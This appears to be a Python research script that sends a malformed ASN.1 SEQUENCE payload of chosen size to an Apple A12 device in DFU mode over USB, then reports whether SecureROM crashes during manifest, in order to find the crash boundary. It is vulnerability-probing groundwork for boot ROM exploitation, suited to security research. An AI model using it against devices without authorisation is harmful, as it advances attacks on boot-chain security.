#!/usr/bin/env python3
"""
Binary search for the exact payload size that crashes A12 SecureROM.
Known: 512B=OK, <=10B=CRASH. Find the boundary.

Usage: python size_boundary_probe.py --size N
  Sends N bytes (SEQUENCE header + zero padding) and reports OK or CRASH.
"""
import sys, time, usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC; DFU_PID = 0x1227

def find_dfu():
    backend = usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)
    dev = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=backend)
    if dev:
        try: dev.set_configuration()
        except: pass
    return dev

def get_status(dev):
    try:
        r = dev.ctrl_transfer(0xA1, 3, 0, 0, 6, timeout=2000)
        if len(r) >= 6:
            return {"bStatus": r[0], "bState": r[4], "poll_ms": r[1]|(r[2]<<8)|(r[3]<<16)}
    except: pass
    return None

def reset_to_idle(dev):
    for _ in range(15):
        st = get_status(dev)
        if not st: return False
        if st["bState"] == 2: return True
        if st["bState"] == 10:
            dev.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)  # CLR_STATUS
        elif st["bState"] in (5, 3):
            dev.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=2000)  # ABORT
        else:
            dev.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=2000)
        time.sleep(0.05)
    return False

def test_size(size):
    dev = find_dfu()
    if not dev:
        print("NO DFU DEVICE"); return None
    
    if not reset_to_idle(dev):
        print("CANNOT REACH IDLE"); return None
    
    # Build payload: SEQUENCE claiming 4096B, padded to 'size' bytes
    payload = (b"\x30\x82\x10\x00" + b"\x00" * max(0, size - 4))[:size]
    if size < 4:
        payload = b"\x30" + b"\x00" * max(0, size - 1)
    
    # DNLOAD
    try:
        dev.ctrl_transfer(0x21, 1, 0, 0, payload, timeout=2000)
    except Exception as e:
        print(f"DNLOAD FAIL: {e}"); return None
    
    st = get_status(dev)
    if not st:
        print(f"SIZE {size:5d}B → CRASH (post-DNLOAD)"); return False
    
    # Wait for dfuDNBUSY → dfuDNLOAD-IDLE
    time.sleep(max(0.01, st["poll_ms"]/1000) + 0.01)
    for _ in range(5):
        st = get_status(dev)
        if st and st["bState"] == 5: break
        if not st: print(f"SIZE {size:5d}B → CRASH (DNLOAD poll)"); return False
        time.sleep(0.06)
    
    # Zero-length DNLOAD → trigger manifest
    try:
        dev.ctrl_transfer(0x21, 1, 1, 0, b"", timeout=2000)
    except Exception as e:
        print(f"MANIFEST TRIGGER FAIL: {e}"); return None
    
    t0 = time.perf_counter()
    
    # Poll manifest
    for _ in range(40):
        st = get_status(dev)
        t_ms = (time.perf_counter() - t0) * 1000
        
        if not st:
            time.sleep(0.5)
            d = find_dfu()
            if not d:
                print(f"SIZE {size:5d}B → CRASH @ {t_ms:.0f}ms")
                return False
            continue
        
        if st["bState"] == 6:  # MANIFEST-SYNC
            time.sleep(max(0.01, st["poll_ms"]/1000) + 0.01)
        elif st["bState"] == 7:  # MANIFEST
            time.sleep(max(0.5, st["poll_ms"]/1000) + 0.5)
        elif st["bState"] == 8:  # MANIFEST-WAIT-RESET
            t_ms = (time.perf_counter() - t0) * 1000
            print(f"SIZE {size:5d}B → OK ({t_ms:.0f}ms)")
            return True
        elif st["bState"] == 10:  # ERROR
            t_ms = (time.perf_counter() - t0) * 1000
            print(f"SIZE {size:5d}B → ERROR ({t_ms:.0f}ms)")
            dev.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
            return True  # didn't crash
        else:
            time.sleep(0.03)
    
    t_ms = (time.perf_counter() - t0) * 1000
    print(f"SIZE {size:5d}B → TIMEOUT ({t_ms:.0f}ms)")
    return True

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--size", type=int, required=True)
    args = p.parse_args()
    test_size(args.size)
